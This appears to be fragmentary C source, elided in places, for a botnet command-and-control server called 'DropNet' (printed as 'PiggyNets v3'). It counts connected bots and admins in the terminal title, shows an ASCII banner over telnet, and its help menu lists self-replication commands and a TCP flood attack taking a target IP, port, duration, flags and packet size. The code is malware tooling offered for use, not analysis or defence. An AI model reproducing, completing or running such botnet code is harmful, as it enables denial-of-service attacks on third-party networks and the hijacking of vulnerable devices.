...
void *titleWriter(void *sock) 
{
        ...
        while(1)
        {
                ...
                sprintf(string, "%c]0; DropNet - Bots: %d - Admins: %d %c", '\033', clientsConnected(), managesConnected, '\007');
...
void *telnetWorker(void *sock) { 
        ...
        sprintf(ascii_banner_line19, "\x1b[1;34m                                                                    \r\n");
		sprintf(ascii_banner_line20, "\x1b[1;34m    ██████╗ ██████╗  ██████╗ ██████╗ ███╗   ██╗███████╗████████╗    \r\n");
		sprintf(ascii_banner_line21, "\x1b[1;34m    ██╔══██╗██╔══██╗██╔═══██╗██╔══██╗████╗  ██║██╔════╝╚══██╔══╝    \r\n");
		sprintf(ascii_banner_line22, "\x1b[1;34m    ██║  ██║██████╔╝██║   ██║██████╔╝██╔██╗ ██║█████╗     ██║       \r\n");
		sprintf(ascii_banner_line23, "\x1b[1;34m    ██║  ██║██╔══██╗██║   ██║██╔═══╝ ██║╚██╗██║██╔══╝     ██║       \r\n");
		sprintf(ascii_banner_line24, "\x1b[1;34m    ██████╔╝██║  ██║╚██████╔╝██║     ██║ ╚████║███████╗   ██║       \r\n");
		sprintf(ascii_banner_line25, "\x1b[1;34m    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝  ╚═══╝╚══════╝   ╚═╝       \r\n");
		sprintf(ascii_banner_line26, "\x1b[1;34m                                                                    \r\n");
		sprintf(line23, "\x1b[1;34mWelcome to DropNet, \x1b[1;32mType HELP.\r\n");
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
...
if(strstr(buf, "HELP")) {
				...
				sprintf(helpline3,  "\x1b[1;32mSELFREP\x1b[1;37m - Self replication commands\r\n");
				...
				sprintf(ddosline3, "\x1b[1;37m !* TCP [IP] [PORT] [TIME] [FLAGS] [PACKETSIZE] [POLL INTERVAL] | TCP FLOOD\r\n");
...
int main (int argc, char *argv[], void *sock)
{
        ...
        printf(RED "\x1b[0;31mPiggyNets v3,\x1b[1;37m DropNets on IG, \x1b[1;37mEnjoy \x1b[1;37mSUCCESSFULLY \x1b[1;36mSCREENED\x1b[0m\n");
